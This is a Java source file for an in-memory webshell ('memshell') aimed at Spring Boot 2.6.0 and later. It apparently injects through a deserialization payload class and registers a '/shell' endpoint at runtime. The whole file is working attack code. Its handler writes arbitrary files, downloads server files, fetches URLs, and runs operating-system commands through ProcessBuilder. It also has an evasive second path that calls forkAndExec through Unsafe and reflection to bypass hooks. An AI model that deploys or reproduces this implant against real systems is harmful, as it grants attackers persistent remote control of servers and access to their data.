package memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import sun.misc.Unsafe;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

//Memshell when SpringBoot>=2.6.0
public class SpringBootController_Higher2_6_0 extends AbstractTranslet {
    static{


        try {
            System.out.println("start static SpringBootController_Higher2_6_0");

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method declaredMethod = Class.forName("memshell.SpringBootController_Higher2_6_0").getDeclaredMethod("login", HttpServletRequest.class, HttpServletResponse.class);
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/shell").options(config).build();
            mappingHandlerMapping.registerMapping(info, Class.forName("memshell.SpringBootController_Higher2_6_0").newInstance(), declaredMethod);

            System.out.println("/shell is been registered");


        } catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |
                 NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
    }

    public SpringBootController_Higher2_6_0() {
        System.out.println("SpringBootController_Higher2_6_0 no args constructor is been used");
    }

    public void login(HttpServletRequest request, HttpServletResponse response) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchMethodException, InvocationTargetException {
        try {

            PrintWriter writer = response.getWriter();

            //任意文件写入
            String writePath = request.getParameter("writePath");
            String writeBytes = request.getParameter("writeBase64");
            if (writePath != null && writeBytes != null) {
                byte[] decode = Base64.getDecoder().decode(writeBytes);
                new FileOutputStream(writePath).write(decode);
            }

            //文件下载
            String filePath = request.getParameter("download");
            if (filePath != null) {
                byte[] bytes = Files.readAllBytes(Paths.get(filePath));
                String s = Base64.getEncoder().encodeToString(bytes);
                writer.write(s);
            }

            //读目录，不会触发Runtime等
            String urlContent = "";
            String read = request.getParameter("read");
            if (read != null) {
                final URL url = new URL(read);
                final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
                String inputLine = "";
                while ((inputLine = in.readLine()) != null) {
                    urlContent = urlContent + inputLine + "\n";
                }
                in.close();
                writer.println(urlContent);
            }


            String arg0 = request.getParameter("code");
//            命令执行ProcessImpl
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }

            String[] strs = request.getParameterValues("cmd");
            //通过forkAndExec命令执行
            if (strs != null) {
                Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
                theUnsafeField.setAccessible(true);
                Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

                Class processClass = null;

                try {
                    processClass = Class.forName("java.lang.UNIXProcess");
                } catch (ClassNotFoundException e) {
                    processClass = Class.forName("java.lang.ProcessImpl");
                }

                Object processObject = unsafe.allocateInstance(processClass);

                // Convert arguments to a contiguous block; it's easier to do
                // memory management in Java than in C.
                byte[][] args = new byte[strs.length - 1][];
                int size = args.length; // For added NUL bytes

                for (int i = 0; i < args.length; i++) {
                    args[i] = strs[i + 1].getBytes();
                    size += args[i].length;
                }

                byte[] argBlock = new byte[size];
                int i = 0;

                for (byte[] arg : args) {
                    System.arraycopy(arg, 0, argBlock, i, arg.length);
                    i += arg.length + 1;
                    // No need to write NUL bytes explicitly
                }

                int[] envc = new int[1];
                int[] std_fds = new int[]{-1, -1, -1};
                Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
                Field helperpathField = processClass.getDeclaredField("helperpath");
                launchMechanismField.setAccessible(true);
                helperpathField.setAccessible(true);
                Object launchMechanismObject = launchMechanismField.get(processObject);
                byte[] helperpathObject = (byte[]) helperpathField.get(processObject);

                int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

                Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                        int.class, byte[].class, byte[].class, byte[].class, int.class,
                        byte[].class, int.class, byte[].class, int[].class, boolean.class
                });

                forkMethod.setAccessible(true);// 设置访问权限

                int pid = (int) forkMethod.invoke(processObject, new Object[]{
                        ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                        null, envc[0], null, std_fds, false
                });

                // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
                Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
                initStreamsMethod.setAccessible(true);
                initStreamsMethod.invoke(processObject, std_fds);

                // 获取本地执行结果的输入流
                Method getInputStreamMethod = processClass.getMethod("getInputStream");
                getInputStreamMethod.setAccessible(true);
                InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                int a = 0;
                byte[] b = new byte[1024];

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }

                writer.write(baos.toString());


            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (SecurityException e) {
            throw new RuntimeException(e);
        } catch (IllegalArgumentException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }



    public static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
